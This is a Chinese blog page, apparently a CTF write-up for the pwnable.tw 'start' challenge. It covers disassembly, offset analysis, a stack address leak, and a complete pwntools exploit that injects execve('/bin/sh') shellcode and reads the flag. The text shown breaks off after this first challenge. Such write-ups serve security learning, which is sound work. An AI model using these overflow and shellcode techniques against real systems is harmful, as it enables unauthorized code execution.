<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>带学弟之一起刷tw | Sh4oBa1&#39;s blog</title>
    <meta name="generator" content="VuePress 1.8.0">
    <link rel="icon" href="/img/favicon.ico">
    <script data-ad-client="ca-pub-7828333725993554" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <meta name="description" content="Syclover的一员,菜鸡Pwn手,默默沉淀,静候葡萄成熟时.">
    <meta name="keywords" content="Syclover,Pwn,Python,C,C++,菜鸡CTFer,山口丁">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c21581be.css" as="style"><link rel="preload" href="/assets/js/app.9038ce9a.js" as="script"><link rel="preload" href="/assets/js/2.6bd067a5.js" as="script"><link rel="preload" href="/assets/js/5.7d169444.js" as="script"><link rel="prefetch" href="/assets/js/10.004a94f4.js"><link rel="prefetch" href="/assets/js/11.5eff2915.js"><link rel="prefetch" href="/assets/js/12.89434380.js"><link rel="prefetch" href="/assets/js/13.37cddbfb.js"><link rel="prefetch" href="/assets/js/14.6733c870.js"><link rel="prefetch" href="/assets/js/15.b875652a.js"><link rel="prefetch" href="/assets/js/16.a8bb5112.js"><link rel="prefetch" href="/assets/js/17.46201733.js"><link rel="prefetch" href="/assets/js/18.8270ae03.js"><link rel="prefetch" href="/assets/js/3.ee40bfe5.js"><link rel="prefetch" href="/assets/js/4.638e59db.js"><link rel="prefetch" href="/assets/js/6.6a3df52b.js"><link rel="prefetch" href="/assets/js/7.dc335bce.js"><link rel="prefetch" href="/assets/js/8.0b592734.js"><link rel="prefetch" href="/assets/js/9.72d63b73.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c21581be.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/SB-logo.png" alt="Sh4oBa1's blog" class="logo"> <span class="site-name can-hide">Sh4oBa1's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="技术" class="dropdown-title"><!----> <span class="title" style="display:;">技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/4ba610/" class="nav-link">pwn基础</a></li><li class="dropdown-item"><!----> <a href="/pages/9bb16d/" class="nav-link">armpwn</a></li><li class="dropdown-item"><!----> <a href="/pages/3f7933/" class="nav-link">堆基础</a></li><li class="dropdown-item"><!----> <a href="/pages/38db4a/" aria-current="page" class="nav-link router-link-exact-active router-link-active">pwnable.tw</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="更多" class="dropdown-title"><!----> <span class="title" style="display:;">更多</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/f2a556/" class="nav-link">学习</a></li><li class="dropdown-item"><!----> <a href="/pages/aea6571b7a8bae86/" class="nav-link">面试</a></li><li class="dropdown-item"><!----> <a href="/pages/2d615df9a36a98ed/" class="nav-link">心情杂货</a></li><li class="dropdown-item"><!----> <a href="/pages/baaa02/" class="nav-link">实用技巧</a></li></ul></div></div><div class="nav-item"><a href="/friends/8107b9/" class="nav-link">friends</a></div><div class="nav-item"><a href="/about/d769bc/" class="nav-link">about</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://i.loli.net/2021/05/18/ycvw4OJW6mPieK7.jpg"> <div class="blogger-info"><h3>Sh4oBa1</h3> <span>二进制菜鸡</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="技术" class="dropdown-title"><!----> <span class="title" style="display:;">技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/4ba610/" class="nav-link">pwn基础</a></li><li class="dropdown-item"><!----> <a href="/pages/9bb16d/" class="nav-link">armpwn</a></li><li class="dropdown-item"><!----> <a href="/pages/3f7933/" class="nav-link">堆基础</a></li><li class="dropdown-item"><!----> <a href="/pages/38db4a/" aria-current="page" class="nav-link router-link-exact-active router-link-active">pwnable.tw</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="更多" class="dropdown-title"><!----> <span class="title" style="display:;">更多</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/f2a556/" class="nav-link">学习</a></li><li class="dropdown-item"><!----> <a href="/pages/aea6571b7a8bae86/" class="nav-link">面试</a></li><li class="dropdown-item"><!----> <a href="/pages/2d615df9a36a98ed/" class="nav-link">心情杂货</a></li><li class="dropdown-item"><!----> <a href="/pages/baaa02/" class="nav-link">实用技巧</a></li></ul></div></div><div class="nav-item"><a href="/friends/8107b9/" class="nav-link">friends</a></div><div class="nav-item"><a href="/about/d769bc/" class="nav-link">about</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/pages/38db4a/" aria-current="page" class="active sidebar-link">带学弟之一起刷tw</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/38db4a/#start" class="sidebar-link">start</a></li><li class="sidebar-sub-header"><a href="/pages/38db4a/#orw" class="sidebar-link">Orw</a></li><li class="sidebar-sub-header"><a href="/pages/38db4a/#calc" class="sidebar-link">calc</a></li><li class="sidebar-sub-header"><a href="/pages/38db4a/#_3x17" class="sidebar-link">3X17</a></li><li class="sidebar-sub-header"><a href="/pages/38db4a/#dubble-sort" class="sidebar-link">Dubble_sort</a></li><li class="sidebar-sub-header"><a href="/pages/38db4a/#hacknote" class="sidebar-link">Hacknote</a></li><li class="sidebar-sub-header"><a href="/pages/38db4a/#silver-bullet" class="sidebar-link">silver_bullet</a></li><li class="sidebar-sub-header"><a href="/pages/38db4a/#applestore" class="sidebar-link">Applestore</a></li></ul></li><li><a href="/pages/9bb16d/" class="sidebar-link">armpwn</a></li><li><a href="/pages/4ba610/" class="sidebar-link">pwn基础</a></li><li><a href="/pages/3f7933/" class="sidebar-link">stack-chunk</a></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper bg-style-1"><div class="articleInfo-wrap" data-v-1cd794fe><div class="articleInfo" data-v-1cd794fe><ul class="breadcrumbs" data-v-1cd794fe><li data-v-1cd794fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-1cd794fe></a></li> <li data-v-1cd794fe><a href="/categories/?category=Pwn" title="分类" data-v-1cd794fe>Pwn</a></li> <!----> <!----></ul> <div class="info" data-v-1cd794fe><div title="作者" class="author iconfont icon-touxiang" data-v-1cd794fe><a href="https://github.com/0xshaobai" target="_blank" title="作者" class="beLink" data-v-1cd794fe>Sh4oBa1</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-1cd794fe><a href="javascript:;" data-v-1cd794fe>2021-04-26</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABKFJREFUSA3tVl1oFVcQnrMbrak3QUgkya1akpJYcrUtIqW1JvFBE9LiQ5v6JmJpolbMg32rVrhgoYK0QiMY6i9Y6EMaW5D+xFJaTYItIuK2Kr3+BJNwkxBj05sQY3b3nM6cs2dv9t7NT/vQJw/sndk5M/PNzJkzewGerP+pAmy+ON8lLzUJgA8ZYxYIYZmGYRnctDaWvJJAmTtfP1pvXsBCCPP8QFcCaRkZYACgDZFO4stNIcBCajEOlmmC9XpJ9bAGCaPaPmzPl32dvLSVu3BWCTQs0XQQ6g0DYgwLIoAZbBCdW/i+781o1VVlm/410mw4h06Y7bIPHNyWDyL4FHkX03Q8SrzNhZTZriieckWt7cL6MM85YcLpsi/7O9/iXFT6MswI0DmmpkSaJ0qLxFIm3+i1THHB3zmBH3PYx9CcykcLOeQVVa7QtdxTgQgEleX2AjHYfwA+2ddV77ruGoJUbhGDI09YSNXyMpUt5ylOzxgbUmtOp7NmbNt8v3arjTBfYELmLUV+M+nSawNNAUqpT3ClJWg5I3BLT+cGW/DXNGCa6tx1aakCGEigArTn4TDIPdrXXYKCZNrHLMCOEPvHBlLQ99s9eHB7EB6NTki73CVPQ2F5MSx/uRQixfmq7rK0wYD8w8E905bnPDfwoWs/rfv93NWN/ZfvwsLIU7A09gxECyISeGJkHAau98L97tuw7NXnoPyNF8FcYGLGKsOs0mN3OEyec9esGW/ZEl945dTP34wlR2FZVQWU1q0Cw8Tr7p+hgLLNL0FPxx/Q35mA8aEUrH6nCgwEl0tn7wUiZYJnNRh6DK4UH/k0lfyrsBKdPVv/AriGIQcEDQZ65LBAGe2Rzui9Ybjz7XUppz1/uKBbyVPGkN3ZAeC6hr0x7Nr38N5+EqkoOm17xpoqR9ohQF55ERSvr4Dkr3chNfC3DMzGJlNBElW8w9nsGQvhNGIzDkXzCg8cLK951xHsFBlTJspJNi3ZFIMF2AeDV3q8DNOB+YHi6QTrChDIWDBRi5U5f+ZMfJLu3ccrqxtdxk4SKH336LFxSmkqefwU5T8fhdSdQf9IVKD6aNiwI/hnmcAZ91isYMJIaCUCx9W098+LgruikeTqzqqxKPUwqJyCPJiyemVVZBOijDGjD38Os0jOiSPL1z3SPjXNANbiNPXAdzTfukjjuknNBbyz3nwgTd3AVFqUJ5hpHlq9MveLnWwttUfoygBmvVjuikxND3znrhsELnZk7k+OjIGxeNEkomyLVta0xxn+HZhjBc4YZ/AFjHjz9u3xRZl2BN4aq9nFwWh16IrQ1aHHEd3j1+4/dB9OtH4e29A2H1DyHQRmOSfQZ1Fy7MHBTGB6J/Djq6p3OxyO2cB+4Car7v/o3GXgfAkj23+x9ID1Teoamo/SXcbvSf2PX7Vc8DdCmE1vN9di+32P9/5YR3vLnhCVGUWBjEkr3yh4H8v9CzmsbdhzOKzsJKM90iFdaTMjRPhGVsakRvOaRidljo6H6G7j+ctrJpsP+4COhDIl0La2+FS4+5mlocBaXY5QnGZysIBYoeSsl5qQzrSj/cgNrfuEzlWBfwA+EjrZyWUvpAAAAABJRU5ErkJggg==">
          带学弟之一起刷tw
        </h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><p></p><div class="table-of-contents"><ul><li><a href="#start">start</a></li><li><a href="#orw">Orw</a></li><li><a href="#calc">calc</a></li><li><a href="#_3x17">3X17</a></li><li><a href="#dubble-sort">Dubble_sort</a></li><li><a href="#hacknote">Hacknote</a></li><li><a href="#silver-bullet">silver_bullet</a></li><li><a href="#applestore">Applestore</a></li></ul></div><p></p> <h1 id="pwnable-tw"><a href="#pwnable-tw" class="header-anchor">#</a> pwnable.tw</h1> <h2 id="start"><a href="#start" class="header-anchor">#</a> start</h2> <h4 id="分析"><a href="#分析" class="header-anchor">#</a> 分析</h4> <p>首先先看保护：</p> <p><img src="https://i.loli.net/2021/04/26/fQw2D5BcdomtasR.jpg" alt="保护"></p> <p>全没开，，然后打开ida分析吧。</p> <div class="language-assembly line-numbers-mode"><pre class="language-text"><code>.text:08048060                                       public _start
.text:08048060                       _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060 000 54                                push    esp
.text:08048061 004 68 9D 80 04 08                    push    offset _exit
.text:08048066 008 31 C0                             xor     eax, eax        ; Logical Exclusive OR
.text:08048068 008 31 DB                             xor     ebx, ebx        ; Logical Exclusive OR
.text:0804806A 008 31 C9                             xor     ecx, ecx        ; Logical Exclusive OR
.text:0804806C 008 31 D2                             xor     edx, edx        ; Logical Exclusive OR
.text:0804806E 008 68 43 54 46 3A                    push    ':FTC'
.text:08048073 00C 68 74 68 65 20                    push    ' eht'
.text:08048078 010 68 61 72 74 20                    push    ' tra'
.text:0804807D 014 68 73 20 73 74                    push    'ts s'
.text:08048082 018 68 4C 65 74 27                    push    2774654Ch
.text:08048087 01C 89 E1                             mov     ecx, esp        ; addr
.text:08048089 01C B2 14                             mov     dl, 14h         ; len
.text:0804808B 01C B3 01                             mov     bl, 1           ; fd
.text:0804808D 01C B0 04                             mov     al, 4
.text:0804808F 01C CD 80                             int     80h             ; LINUX - sys_write
.text:08048091 01C 31 DB                             xor     ebx, ebx        ; Logical Exclusive OR
.text:08048093 01C B2 3C                             mov     dl, 3Ch
.text:08048095 01C B0 03                             mov     al, 3
.text:08048097 01C CD 80                             int     80h             ; LINUX -
.text:08048099 01C 83 C4 14                          add     esp, 14h        ; Add
.text:0804809C 008 C3                                retn                    ; Return Near from Procedure
.text:0804809C                       _start          endp ; sp-analysis failed
.text:0804809C
.text:0804809D
.text:0804809D                       ; =============== S U B R O U T I N E =======================================
.text:0804809D
.text:0804809D                       ; Attributes: noreturn
.text:0804809D
.text:0804809D                       ; void exit(int status)
.text:0804809D                       _exit           proc near               ; DATA XREF: _start+1↑o
.text:0804809D
.text:0804809D                       status          = dword ptr  4
.text:0804809D
.text:0804809D 000 5C                                pop     esp
.text:0804809E -04 31 C0                             xor     eax, eax        ; Logical Exclusive OR
.text:080480A0 -04 40                                inc     eax             ; Increment by 1
.text:080480A1 -04 CD 80                             int     80h             ; LINUX - sys_exit
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>可以把这串汇编自己手动翻译一下：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;Let's start the CTF:&quot;</span><span class="token punctuation">;</span>
    <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span>esp_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> <span class="token number">0x80</span><span class="token punctuation">;</span>
    <span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>esp_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//由于在调试的时候发现esp_addr是不变的.</span>
    <span class="token keyword">int</span> <span class="token number">0x80</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>大致其实可以看出，调用了<code>sys_wirte</code>将<code>push</code> 的那一段文字，先打印在回显上。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>/mnt/f/pwnable.tw/start
❯ ./start
<span class="token string">&quot;Let's start the CTF:&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>然后就只需要利用<code>sys_read</code>进行攻击就行了。</p> <p>当然是写<code>shellcode</code>进行攻击：这里需要知道<code>linux</code>的<a href="https://0xc4m3l-jiang.github.io/2020/08/11/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/" target="_blank" rel="noopener noreferrer">系统调用表<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>我们先试着输入数据，找偏移</p> <p><img src="https://i.loli.net/2021/04/26/PtlYwsMRNjTOfpe.jpg" alt="输入"></p> <p>这样就有了一个想法，后面有一个<code>pop esp</code>可以利用这个溢出，调用<code>esp</code>储存的地址。然后写入shellcode。但是前提条件是，需要知道一个栈上的指针(地址)。再次运行，发现亮点</p> <p><img src="https://i.loli.net/2021/04/26/fAHGmK9eyTZr537.jpg" alt="泄露"></p> <p>然后我们得找到写shellcode的地址啊。</p> <p><img src="https://i.loli.net/2021/04/26/NmG57zrpHAXcDkq.jpg" alt="找到shellcode_addr"></p> <h4 id="exp"><a href="#exp" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

arch      <span class="token operator">=</span> <span class="token number">32</span>
challenge <span class="token operator">=</span> <span class="token string">&quot;./start&quot;</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span>challenge<span class="token punctuation">)</span>
    <span class="token comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>challenge<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;chall.pwnable.tw&quot;</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>
    <span class="token comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>
p   <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> pause<span class="token punctuation">(</span><span class="token punctuation">)</span> 
s   <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> success<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
re  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>
<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    loading <span class="token operator">=</span> <span class="token number">0x14</span>
    use_esp <span class="token operator">=</span> <span class="token number">0x08048087</span>
    payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">*</span>loading<span class="token punctuation">,</span>use_esp<span class="token punctuation">]</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">&quot;Let's start the CTF:&quot;</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>
    stack_esp <span class="token operator">=</span> u32<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    slog<span class="token punctuation">[</span><span class="token string">'stack_esp'</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack_esp
    shellcode_addr <span class="token operator">=</span> stack_esp <span class="token operator">+</span> <span class="token number">0x14</span>
    slog<span class="token punctuation">[</span><span class="token string">'shellcode_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> shellcode_addr
    shellcode <span class="token operator">=</span> makeshellcode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'shellcode:'</span> <span class="token operator">+</span> shellcode
    <span class="token comment">#db()</span>
    payload2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">*</span>loading<span class="token punctuation">,</span>shellcode_addr<span class="token punctuation">,</span>shellcode<span class="token punctuation">]</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">&quot;cat /home/start/flag&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">makeshellcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
    xor ecx,ecx
    mul ecx
    push eax
    push 0x68732F2F 
    push 0x6E69622F
    mov ebx,esp
    mov al,0x0B
    int 0x80
    '''</span>
    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
    <span class="token keyword">return</span> shellcode
<span class="token comment">#xor ecx,ecx与mul ecx 很巧妙，mul ecx将edx与eax同时置0   </span>
<span class="token comment">#sys_execve('/bin/sh')</span>


exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
